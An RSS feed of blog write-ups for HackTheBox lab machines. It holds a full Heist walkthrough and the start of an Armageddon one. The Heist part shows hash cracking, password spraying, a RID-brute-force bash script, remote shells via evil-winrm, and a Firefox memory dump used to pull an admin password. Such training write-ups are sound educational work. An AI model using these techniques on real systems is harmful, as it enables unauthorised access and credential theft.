<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Writeup on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/categories/writeup/</link>
    <description>Recent content in Writeup on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 28 Jul 2021 04:05:19 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Heist</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</link>
      <pubDate>Wed, 28 Jul 2021 04:05:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</guid>
      <description>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system.</description>
      <content:encoded><![CDATA[<p>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system. There are multiple instances of Firefox running which can be dumped to obtain the password for administrator account.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Password spray attack</li>
<li>Username enumeration via RPC using RID brute-force.</li>
<li>Process dump</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Hashcat</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:43 EDT
Nmap scan report <span class="k">for</span> 10.10.10.149
Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
Not shown: <span class="m">65530</span> filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 148.82 seconds
→ kali@kali «heist» «10.10.14.83» 
$ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:46 EDT
Nmap scan report <span class="k">for</span> 10.10.10.149
Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
<span class="p">|</span> http-cookie-flags: 
<span class="p">|</span>   /: 
<span class="p">|</span>     PHPSESSID: 
<span class="p">|</span>_      httponly flag not <span class="nb">set</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Potentially risky methods: TRACE
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span> http-title: Support Login Page
<span class="p">|</span>_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 2m52s
<span class="p">|</span> smb2-security-mode: 
<span class="p">|</span>   2.02: 
<span class="p">|</span>_    Message signing enabled but not required
<span class="p">|</span> smb2-time: 
<span class="p">|</span>   date: 2021-07-12T01:50:42
<span class="p">|</span>_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.94 seconds
</code></pre></div><p>I probably won&rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">this post</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Without credentials, I can&rsquo;t do much on SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ smbclient -N -L //10.10.10.149
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website on port 80 presented with a login page.</p>
<p><img class="img-container" src="imgs/image-20210712085020304.png" alt="image-20210712085020304"  />
</p>
<p>No register button was found here, so I clicked the guest login and it brought me to the following page.</p>
<p><img class="img-container" src="imgs/image-20210712085409456.png" alt="image-20210712085409456"  />
</p>
<p>From the chat above, user Hazard attached his cisco configuration in a text file, and this config file contains several credentials.</p>
<p><img class="img-container" src="imgs/image-20210712085452329.png" alt="image-20210712085452329"  />
</p>
<p>I know this is not my business, but looks like this part messed up his router 😅.</p>
<p><img class="img-container" src="imgs/image-20210726174927930.png" alt="image-20210726174927930"  />
</p>
<p>So anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.</p>
<h3 id="password-crack">Password Crack</h3>
<p>The first password can be recovered with <code>hashcat</code> (identified as md5crypt).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">500</span> hashes/heist-cisco.hash ../../rockyou.txt -O

...<span class="o">[</span>SNIP<span class="o">]</span>...

<span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1</span>$ <span class="o">(</span>MD5<span class="o">)</span>
Hash.Target......: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
Time.Started.....: Mon Jul <span class="m">12</span> 08:58:28 <span class="m">2021</span> <span class="o">(</span><span class="m">2</span> secs<span class="o">)</span>
Time.Estimated...: Mon Jul <span class="m">12</span> 08:58:30 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>../../rockyou.txt<span class="o">)</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using <a href="https://davidbombal.com/cisco-type-7-password-decryption/">this site</a> .</p>
<p><img class="img-container" src="imgs/image-20210712090727149.png" alt="image-20210712090727149"  />
</p>
<p><img class="img-container" src="imgs/image-20210712090628350.png" alt="image-20210712090628350"  />
</p>
<p>Now I have one password and two set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword
admin:02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
</code></pre></div><h3 id="access-as-hazard">Access as Hazard</h3>
<h4 id="password-spray">Password Spray</h4>
<p>With user <code>hazard</code> included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using <code>crackmapexec</code>. The results reveals that the password <code>stealth1agent</code>  works for user <code>hazard</code>, but it doesn&rsquo;t show &ldquo;Pwn3d!&rdquo; message, this means I have no access to WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list
SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>+<span class="o">]</span> SupportDesk<span class="se">\h</span>azard:stealth1agent 
</code></pre></div><p>Another spray shows that user <code>hazard</code> can login into RPC servic as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@stealth1agent 
Account Name: Hazard, Authority Name: SUPPORTDESK
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@<span class="nv">$uperP</span>@ssword 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@stealth1agent 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@<span class="nv">$uperP</span>@ssword 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</code></pre></div><h4 id="user-enumeration-via-rpc">User Enumeration via RPC</h4>
<p>Since the share doesn&rsquo;t contain anything juicy, the other things I can do with user hazard is enumeration on RPC.</p>
<p>Within <code>rpcclient</code> shell, <code>enumdomusers</code> is typically used to enumerate domain users, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ rpcclient -U <span class="s1">&#39;hazard%stealth1agent&#39;</span> 10.10.10.149                   
rpcclient $&gt; srvinfo
        10.10.10.149   Wk Sv NT SNT         
        platform_id     :       <span class="m">500</span>
        os version      :       10.0
        server <span class="nb">type</span>     :       0x9003
rpcclient $&gt; enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
</code></pre></div><p>Based on the result, the problem here was not the user&rsquo;s permissions. But, fortunately, the  <code>lookupnames</code>  command can be used to retrieve user&rsquo;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 <span class="o">(</span>User: 1<span class="o">)</span>
</code></pre></div><p>Reverse lookups (SID to username) also works here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>In Windows system, excluding RID, this value <code>S-1-5-21-4254423774-1266059056-3197185112-RID</code>  is likely to be unique and is fixed for each computer domain. A normal user RID usually starts from 1000, and with this, I can enumerate the available users by incrementing the number.</p>
<p>The enumeration can be scripted using bash, and I&rsquo;ve created one to enumerate the first 20 users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="nv">sid</span><span class="o">=</span><span class="s2">&#34;S-1-5-21-4254423774-1266059056-3197185112&#34;</span>

<span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1000</span> 1020<span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
 rpcclient -U <span class="s2">&#34;hazard%stealth1agent&#34;</span> -c <span class="s2">&#34;lookupsids </span><span class="nv">$sid</span><span class="s2">-</span><span class="nv">$i</span><span class="s2">;quit&#34;</span> 10.10.10.149 <span class="p">|</span> cut -d f2
<span class="k">done</span>
</code></pre></div><blockquote>
<p>Note: <code>enumdomusers</code> RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it&rsquo;s 0x1F4.</p>
</blockquote>
<p>I saved the script as <code>rpc-userenum.sh</code> and ran it, and it returned with three valid usernames. I will add these usernames to my username wordlist.</p>
<p><img class="img-container" src="imgs/image-20210712105959998-1627299069625.png" alt="image-20210712105959998"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-chase">Shell as Chase</h3>
<h4 id="password-spray-1">Password Spray</h4>
<p>With updated username wordlist, I could do another password spray attack on WinRM. The results shows a &ldquo;Pwn3d!&rdquo; message for user <code>chase</code> with a password of <code>Q4)sJu\Y8qz*A3?d </code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list 
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:10.10.10.149<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> http://10.10.10.149:5985/wsman
...<span class="o">[</span>SNIP<span class="o">]</span>...
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>+<span class="o">]</span> None<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div><h4 id="winrm---chase">WinRM - Chase</h4>
<p>I can login into the system with <code>chase</code>&rsquo;s credentials using <code>evil-winrm</code>. The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;chase&#39;</span> -p <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span>

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
supportdesk<span class="se">\c</span>hase
SupportDesk

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c
   Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
a127d...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="tools-share">Tools Share</h4>
<p>Before going further, I would like to host my essential tools using <code>impacket-smbserver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ impacket-smbserver ef ~/tools -smb2support -username ef -password ef
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.149,49708<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\e</span>f,SUPPORTDESK<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> User SUPPORTDESK<span class="se">\e</span>f authenticated successfully
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The share then used on Heist. With this, I could use any of my tools directly from the share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> net use <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f /user:ef ef
The <span class="nb">command</span> completed successfully.

*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f
*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.14.83<span class="se">\e</span>f&gt; 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>chase</code>&rsquo;s Desktop there is another file called <code>todo.txt</code>. As the name implies, it contains to-do list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">type</span> todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access <span class="k">for</span> guest user.
</code></pre></div><p>While looking at the WinPEAS output, I noticed multiple Firefox processes were running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">  [+] Current TCP Listening Ports
   [?] Check for services restricted from the outside 
  Enumerating IPv4 connections
         
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

...[SNIP]...

  TCP        127.0.0.1             49672         127.0.0.1             49673           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49673         127.0.0.1             49672           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49680         127.0.0.1             49681           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49681         127.0.0.1             49680           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49682         127.0.0.1             49683           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49683         127.0.0.1             49682           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</code></pre></div><p>Based on the to-do list, this means that user <code>chase</code> periodically open a browser to check the issues list.</p>
<h4 id="dump-firefox-process">Dump Firefox Process</h4>
<p>I will employs <code>procdump64.exe</code> to dump the Firefox data from the memory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f<span class="se">\p</span>rocdump64.exe -accepteula -ma <span class="m">6868</span>

ProcDump v10.0 - Sysinternals process dump utility
Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> initiated: C:<span class="se">\i</span>amf<span class="se">\f</span>irefox.exe_210712_230707.dmp
<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> writing: Estimated dump file size is <span class="m">535</span> MB.
<span class="o">[</span>23:07:08<span class="o">]</span> Dump <span class="m">1</span> complete: <span class="m">536</span> MB written in 1.5 seconds
<span class="o">[</span>23:07:09<span class="o">]</span> Dump count reached.
</code></pre></div><p>Because I don&rsquo;t want to grab that fatty <code>536 MB</code> file,  I will use  <code>strings64.exe</code> and redirect the output to a text file to get some readable part from the dump file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; cmd /c <span class="s2">&#34;\\10.10.14.83\ef\strings64.exe -accepteula firefox.exe_210712_230707.dmp &gt; foxdump.txt&#34;</span>
cmd.exe : 
    + CategoryInfo          : NotSpecified: <span class="o">(</span>:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Strings v2.54 - Search <span class="k">for</span> ANSI and Unicode strings in binary images.
Copyright <span class="o">(</span>C<span class="o">)</span> 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; dir


    Directory: C:<span class="se">\i</span>amf


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/12/2021  11:07 PM      <span class="m">547841456</span> firefox.exe_210712_230707.dmp
-a----        7/12/2021  11:18 PM      <span class="m">136871696</span> foxdump.txt
</code></pre></div><p>Searching for a string &ldquo;password&rdquo; in the converted dump file reveals the password used by admin (<code>4dD!5}x/re8]FBuZ</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; gc foxdump.txt <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;password&#34;</span>

<span class="s2">&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb<span class="p">&amp;</span><span class="nv">login_password</span><span class="o">=</span>4dD!5<span class="o">}</span>x/re8<span class="o">]</span>FBuZ<span class="p">&amp;</span><span class="nv">login</span><span class="o">=</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p><strong>[Side note]</strong></p>
<p>If this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.</p>
<p><img class="img-container" src="imgs/image-20210726192951302.png" alt="image-20210726192951302"  />
</p>
<h4 id="winrm---administrator">WinRM - Administrator</h4>
<p>The password <code>4dD!5}x/re8]FBuZ</code> is reused for administrator account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;Administrator&#39;</span> -p <span class="s1">&#39;4dD!5}x/re8]FBuZ&#39;</span>

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
supportdesk<span class="se">\a</span>dministrator
SupportDesk

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91
   Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
50dfa...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://davidbombal.com/cisco-type-7-password-decryption/">https://davidbombal.com/cisco-type-7-password-decryption/</a></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Armageddon</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-armageddon/</link>
      <pubDate>Mon, 26 Jul 2021 11:21:43 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-armageddon/</guid>
      <description>Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I&amp;rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to login and dump the user credentials from MySQL database. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.</description>
      <content:encoded><![CDATA[<p>Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I&rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to login and dump the user credentials from MySQL database. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Drupal 7 exploitation using Drupalgeddon2</li>
<li>Privilege escalation via malicious snap package</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Metasploit</li>
<li><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">Dirty_sockv2.py</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial <code>nmap</code> scan discovers two open ports: SSH on 22 and an Apache Web Server serving Drupal 7 on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
$ nmap -sC -sV -oA scans/10-initial-armageddon 10.129.90.96
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-29 22:27 EDT
Nmap scan report <span class="k">for</span> 10.129.90.96
Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
<span class="p">|</span>_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
<span class="p">|</span>_http-generator: Drupal <span class="m">7</span> <span class="o">(</span>http://drupal.org<span class="o">)</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span> http-robots.txt: <span class="m">36</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
<span class="p">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 
<span class="p">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
<span class="p">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
<span class="p">|</span>_/LICENSE.txt /MAINTAINERS.txt
<span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
<span class="p">|</span>_http-title: Welcome to  Armageddon <span class="p">|</span>  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Mon Mar 29 22:28:01 2021 -- 1 IP address (1 host up) scanned in 51.04 seconds</span>
</code></pre></div><p>Nmap also identified the OS as CentOs, so there is a chance that it would only allow outgoing connection to ports below 1024.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80----website">TCP 80 -  Website</h3>
<p>Visiting port 80 presents a page that has no other content except a login form.</p>
<p><img class="img-container" src="imgs/image-20210330094613154.png" alt="image-20210330094613154"  />
</p>
<p>A previous <code>nmap</code> scan detected that there was a changelog file. Poking <code>/CHANGELOG.txt</code> discovers the exact version of this Drupal instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
$ curl -s http://10.129.90.96/CHANGELOG.txt 
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues <span class="o">(</span>access bypass<span class="o">)</span>. See SA-CORE-2017-003.
